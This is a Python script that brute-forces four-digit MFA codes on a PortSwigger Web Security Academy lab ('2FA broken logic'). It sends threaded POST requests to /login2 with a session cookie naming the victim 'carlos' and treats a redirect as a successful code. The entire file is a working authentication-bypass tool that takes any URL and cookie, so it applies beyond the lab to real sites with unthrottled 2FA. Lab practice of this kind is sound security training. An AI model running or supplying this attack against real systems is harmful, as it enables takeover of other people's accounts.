#!/usr/bin/env python3
"""
MFA code brute-forcer (PortSwigger 2FA broken logic lab).

The session cookie already carries `verify=carlos`, so we only need to
brute-force the 4-digit `mfa-code` on POST /login2.

Usage:
  python3 mfa_bruteforce.py \
      --url https://<id>.web-security-academy.net/login2 \
      --cookie "session=...; verify=carlos" \
      --verify carlos --workers 20

  ... --verbose
  ... --csv attempts.csv
"""
from __future__ import annotations

import argparse
import csv
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

try:
    import requests
    from requests import RequestException
except ImportError:
    print('error: pip3 install requests', file=sys.stderr)
    sys.exit(2)


def main() -> int:
    ap = argparse.ArgumentParser(description='MFA code brute-forcer (2FA broken logic).')
    ap.add_argument('--url', required=True, help='https://<id>.web-security-academy.net/login2')
    ap.add_argument('--cookie', required=True, help='e.g. "session=...; verify=carlos"')
    ap.add_argument('--verify', default='carlos', help='value of the verify parameter')
    ap.add_argument('--code-field', default='mfa-code')
    ap.add_argument('--verify-field', default='verify')
    ap.add_argument('--code-width', type=int, default=4)
    ap.add_argument('--workers', type=int, default=20)
    ap.add_argument('--timeout', type=float, default=20.0)
    ap.add_argument('--verbose', action='store_true')
    ap.add_argument('--csv', default='')
    args = ap.parse_args()

    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (MfaBruteforce)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': args.cookie,
    })
    s.headers['Origin'] = 'https://' + args.url.split('/')[2]
    s.headers['Referer'] = args.url

    codes = [str(i).zfill(args.code_width) for i in range(10 ** args.code_width)]
    print(f'[*] target={args.url}', file=sys.stderr)
    print(f'[*] verify={args.verify} codes={len(codes)} workers={args.workers}', file=sys.stderr)

    lock = threading.Lock()
    rows = []
    hits = []
    done = {'n': 0}

    def try_code(code):
        try:
            r = s.post(args.url,
                       data={args.verify_field: args.verify, args.code_field: code},
                       timeout=args.timeout, allow_redirects=False)
        except RequestException:
            return False
        with lock:
            done['n'] += 1
            rows.append((code, r.status_code, r.headers.get('Location', '')))
            if args.verbose and done['n'] % 250 == 0:
                print(f'    tried {done["n"]}/{len(codes)}', file=sys.stderr)
        if r.status_code in (301, 302, 303, 307, 308):
            with lock:
                hits.append((code, r.status_code, r.headers.get('Location', '')))
            return True
        return False

    t0 = time.time()
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        list(ex.map(try_code, codes))

    if args.csv:
        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            w.writerow(('code', 'status', 'location'))
            w.writerows(rows)
        print(f'[*] CSV: {args.csv} ({time.time()-t0:.1f}s)', file=sys.stderr)

    if hits:
        for code, st, loc in hits:
            print(f'HIT {code} ({st}) {loc}')
        return 0
    print(f'[-] not found ({len(codes)} codes, {time.time()-t0:.1f}s)', file=sys.stderr)
    return 1


if __name__ == '__main__':
    sys.exit(main())